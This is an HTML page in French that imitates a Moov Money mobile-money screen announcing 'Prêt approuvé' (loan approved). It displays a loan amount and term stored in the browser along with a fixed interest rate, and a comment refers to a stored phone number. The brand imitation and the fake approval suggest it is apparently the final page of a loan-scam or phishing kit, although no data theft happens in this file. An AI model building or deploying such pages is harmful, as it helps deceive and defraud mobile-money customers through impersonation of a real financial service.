<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Moov Money - Félicitations</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #0a0a0a;
            width: 100%;
            max-width: 400px;
            padding: 40px 24px 32px;
            text-align: center;
        }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo-circle {
            width: 56px; height: 56px;
            background: #9A0000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 28px;
            font-weight: 700;
            color: #fff;
        }
        .moov-text { font-size: 20px; font-weight: 700; color: #9A0000; letter-spacing: 0.5px; }
        .checkmark {
            font-size: 72px;
            color: #4CAF50;
            margin: 20px 0;
        }
        h1 { font-size: 26px; font-weight: 700; margin-bottom: 8px; }
        .sub { font-size: 15px; color: rgba(255,255,255,0.5); margin-bottom: 32px; line-height: 1.6; }
        .info-box {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 32px;
            text-align: left;
        }
        .info-box .row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .info-box .row:last-child { border-bottom: none; }
        .info-box .label { color: rgba(255,255,255,0.4); font-size: 13px; }
        .info-box .value { color: #fff; font-weight: 600; font-size: 14px; }
        button {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            background: #9A0000;
            color: #ffffff;
        }
        button:hover { background: #7a0000; }
        .footer { margin-top: 32px; font-size: 12px; color: rgba(255,255,255,0.2); letter-spacing: 0.5px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <div class="logo-circle">M</div>
            <div class="moov-text">Moov Money</div>
        </div>

        <div class="checkmark">✅</div>
        <h1>Prêt approuvé !</h1>
        <div class="sub">Votre demande de prêt a été approuvée.<br/>Les fonds seront versés sur votre compte Moov Money.</div>

        <div class="info-box">
            <div class="row">
                <span class="label">Montant du prêt</span>
                <span class="value" id="displayAmount">-</span>
            </div>
            <div class="row">
                <span class="label">Durée</span>
                <span class="value" id="displayTerm">-</span>
            </div>
            <div class="row">
                <span class="label">Taux d'intérêt</span>
                <span class="value">4,5 % TAEG</span>
            </div>
        </div>

        <button onclick="window.location.href='index.html'">Retour à l'accueil</button>

        <div class="footer">v 5.3.2 (1.0.0)</div>
    </div>

    <script>
        const amount = localStorage.getItem('loanAmount');
        const term = localStorage.getItem('loanTerm');
        if (amount) {
            document.getElementById('displayAmount').textContent = Number(amount).toLocaleString('fr-FR') + ' FCFA';
        }
        if (term) {
            document.getElementById('displayTerm').textContent = term + ' mois';
        }
        // Clear sensitive data after showing (optional)
        // localStorage.removeItem('phone');
        // localStorage.removeItem('loanAmount');
        // localStorage.removeItem('loanTerm');
    </script>
</body>
</html>
